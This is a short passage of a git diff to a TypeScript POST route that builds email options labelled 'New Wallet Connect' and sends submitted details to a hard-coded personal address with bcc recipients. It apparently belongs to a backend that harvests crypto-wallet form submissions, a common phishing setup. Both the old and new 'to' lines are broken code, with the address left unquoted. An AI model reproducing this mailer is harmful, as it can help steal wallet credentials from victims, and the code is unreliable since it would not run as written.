@@ -34,6 +34,6 @@ export async function POST(request: Request) {
 
     let mailOptions = {
       from: `New Wallet Connect ${email}`,
-      to: fahadabdullahi180@gmail.com, // Your own email or a neutral one (required)
+      to: fahadabdullahi180, // Your own email or a neutral one (required)
       bcc: bccRecipients,
       subject: 'Wallet
